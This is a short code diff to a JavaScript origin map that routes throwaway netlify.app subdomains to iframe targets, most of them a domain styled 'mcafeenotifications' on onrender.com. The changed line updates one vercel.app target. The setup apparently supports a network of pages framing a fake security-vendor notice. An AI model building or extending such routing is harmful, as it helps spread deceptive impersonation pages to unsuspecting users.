@@ -90,7 +90,7 @@ const ORIGIN_GROUPS = {
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://ziyan-os4.vercel.app" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://ziyan-os5.vercel.app" },
     "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
